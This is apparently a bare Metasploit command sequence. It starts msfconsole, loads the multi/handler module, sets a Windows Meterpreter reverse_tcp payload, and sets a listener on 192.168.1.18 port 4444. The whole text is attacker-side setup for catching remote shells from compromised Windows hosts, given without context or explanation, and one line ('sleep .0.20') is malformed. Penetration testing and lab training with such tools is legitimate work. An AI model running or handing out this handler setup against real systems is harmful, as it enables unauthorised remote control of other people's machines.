msfconsole
sleep .0.20
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost 192.168.1.18
set lport 4444
run